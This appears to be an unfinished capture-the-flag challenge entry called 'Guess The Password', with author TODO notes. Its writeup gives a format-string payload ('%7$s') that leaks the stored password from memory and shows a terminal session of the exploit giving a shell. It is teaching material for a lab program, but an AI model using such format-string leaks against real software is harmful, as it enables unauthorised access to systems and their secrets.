# Name
Guess The Password

# Description
I've been trying to hack into this server, but it's locked by some password checking mechanism. Every time that an account gets locked, it randomly generates a new password. Any idea how to get past this?

TODO: Put a netcat command here telling them which server to connect to in order to test the exploit.

# Difficulty
Medium

# Flag
I haven't programmed a flag into this yet. Basically, after they exploit the program, they should get a shell into the server running this program. There should be a flag.txt file on that server in the same directory as the program, which they should be able to cat. Whoever is setting up this server can just put whatever they want into the flag.txt file and have that be the flag.

# Hints
None

# Author Name
Nihaal Prasad

# Writeup
If you type in ```%7$s``` as the password, it will print out the actual password from memory. Just paste that password in to get root access.

```
$ ./guess
What's the password?: %7$s
Incorrect password: k73<&e3J+T0#`%`Ezcu64J.HfOX3=}nDP#zV$/<0}fM_(0&>s8T)b}kdN_3k^#K1AG#_VZooBYPdiq$xEs=)r**Bj=JJ[1u8Y5wKo%=M^)4cz8]A-ze;&+x,b^q?ohqJ}'v*FOX@Xl%U@b2hxw%:$}Gg]:Bi>P5>WGb9v<YQ*^Be\TOpNn,lnmog)NRb $<qK FD=!1aySHq)3cq$+z.y'1>U "o$X|iYDIv_ZstIXgmkfzo.29C:K{+K 7irOn
What's the password?: k73<&e3J+T0#`%`Ezcu64J.HfOX3=}nDP#zV$/<0}fM_(0&>s8T)b}kdN_3k^#K1AG#_VZooBYPdiq$xEs=)r**Bj=JJ[1u8Y5wKo%=M^)4cz8]A-ze;&+x,b^q?ohqJ}'v*FOX@Xl%U@b2hxw%:$}Gg]:Bi>P5>WGb9v<YQ*^Be\TOpNn,lnmog)NRb $<qK FD=!1aySHq)3cq$+z.y'1>U "o$X|iYDIv_ZstIXgmkfzo.29C:K{+K 7irOn
You guessed correctly!
$ ls
guess
$
```
